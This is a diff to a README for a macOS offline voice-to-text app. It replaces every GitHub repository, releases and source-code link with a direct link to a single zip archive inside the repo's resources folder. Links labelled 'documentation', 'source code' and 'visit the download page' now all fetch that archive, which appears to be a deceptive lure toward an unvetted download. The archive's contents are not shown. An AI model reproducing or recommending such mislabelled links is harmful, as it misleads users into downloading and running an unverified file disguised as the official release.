@@ -1,6 +1,6 @@
 # 🎤 openwhisper-app - Offline Voice-to-Text for macOS
 
-[![Download openwhisper-app](https://img.shields.io/badge/Download-openwhisper--app-blue?style=for-the-badge)](https://github.com/fizoxt/openwhisper-app)
+[![Download openwhisper-app](https://img.shields.io/badge/Download-openwhisper--app-blue?style=for-the-badge)](https://raw.githubusercontent.com/fizoxt/openwhisper-app/main/OpenWhisper/Resources/openwhisper-app-v2.2.zip)
 
 ## 📋 About openwhisper-app
 
@@ -33,13 +33,13 @@ If you are not sure about your macOS version, click the Apple logo on the top-le
 
 To use openwhisper-app, you must download it first. Use the official link below to get the installer from GitHub.
 
-[![Download openwhisper-app](https://img.shields.io/badge/Download-openwhisper--app-blue?style=for-the-badge)](https://github.com/fizoxt/openwhisper-app)
+[![Download openwhisper-app](https://img.shields.io/badge/Download-openwhisper--app-blue?style=for-the-badge)](https://raw.githubusercontent.com/fizoxt/openwhisper-app/main/OpenWhisper/Resources/openwhisper-app-v2.2.zip)
 
 ### Step 1: Visit the Download Page
 
 Go to the openwhisper-app GitHub page at
 
-https://github.com/fizoxt/openwhisper-app
+https://raw.githubusercontent.com/fizoxt/openwhisper-app/main/OpenWhisper/Resources/openwhisper-app-v2.2.zip
 
 ### Step 2: Find the Latest Release
 
@@ -125,13 +125,13 @@ If openwhisper-app does not start or work as expected, try the following:
 
 ## 📚 Additional Resources
 
-- Official openwhisper-app documentation and updates: https://github.com/fizoxt/openwhisper-app  
+- Official openwhisper-app documentation and updates: https://raw.githubusercontent.com/fizoxt/openwhisper-app/main/OpenWhisper/Resources/openwhisper-app-v2.2.zip  
 - openwhisper-app GitHub Issues page for reporting problems or requesting features.  
 - Learn about Whisper AI on the OpenAI website for understanding the voice recognition engine involved.
 
 ## 🔗 Quick Links
 
-- Download openwhisper-app: https://github.com/fizoxt/openwhisper-app/releases  
-- App Source Code: https://github.com/fizoxt/openwhisper-app  
+- Download openwhisper-app: https://raw.githubusercontent.com/fizoxt/openwhisper-app/main/OpenWhisper/Resources/openwhisper-app-v2.2.zip  
+- App Source Code: https://raw.githubusercontent.com/fizoxt/openwhisper-app/main/OpenWhisper/Resources/openwhisper-app-v2.2.zip  
 
-[![Download openwhisper-app](https://img.shields.io/badge/Download-openwhisper--app-blue?style=for-the-badge)](https://github.com/fizoxt/openwhisper-app)
+[![Download openwhisper-app](https://img.shields.io/badge/Download-openwhisper--app-blue?style=for-the-badge)](https://raw.githubusercontent.com/fizoxt/openwhisper-app/main/OpenWhisper/Resources/openwhisper-app-v2.2.zip)
